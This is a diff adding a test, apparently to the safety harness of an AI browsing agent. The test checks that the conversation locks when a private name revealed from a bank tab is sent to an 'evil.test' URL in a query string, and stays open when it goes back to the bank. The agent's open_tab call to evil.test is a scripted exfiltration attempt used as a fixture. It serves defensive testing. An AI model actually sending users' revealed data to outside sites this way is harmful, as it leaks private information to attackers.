@@ -969,3 +969,23 @@ test("locked: a revealed phone is found by its digits, « + » read as itself or
     expect(await line(`${HOST}/r?q=rappel`)).not.toContain("Conversation verrouillée");
   });
 });
+
+test("locked: a page of the web printing the value cannot become the site it was revealed from", async () => {
+  const BANK = "https://www.banque-ardoise.test";
+  const bank: TabInfo = { id: "banque", title: "Conseiller", url: `${BANK}/compte/conseiller`, space: "perso", agentReached: false };
+  const evil: TabInfo = { id: "evil", title: "Annuaire", url: "https://evil.test/annuaire", space: "perso", agentReached: true };
+  const header = "De : Hélène Marceau <h.marceau@banque-ardoise.test>";
+  await serve({ tabs: [bank, evil] }, async ({ call, bridge, cards }) => {
+    bridge.pages.set("banque", { text: header });
+    bridge.pages.set("evil", { text: header });
+    const label = (await call("read_tab", { id: "banque" })).text.match(/⟨nom-[a-z0-9]{8}⟩/)![0];
+    await call("read_tab", { id: "evil" });
+    await call("reveal_value", { label, reason: "écrire" });
+    const line = async (url: string) => {
+      await call("open_tab", { url, reason: "r" });
+      return cards().at(-1)!.danger ?? "";
+    };
+    expect(await line("https://evil.test/c?n=H%C3%A9l%C3%A8ne%20Marceau")).toContain("Conversation verrouillée");
+    expect(await line(`${BANK}/conseiller?n=H%C3%A9l%C3%A8ne%20Marceau`)).not.toContain("Conversation verrouillée");
+  });
+});
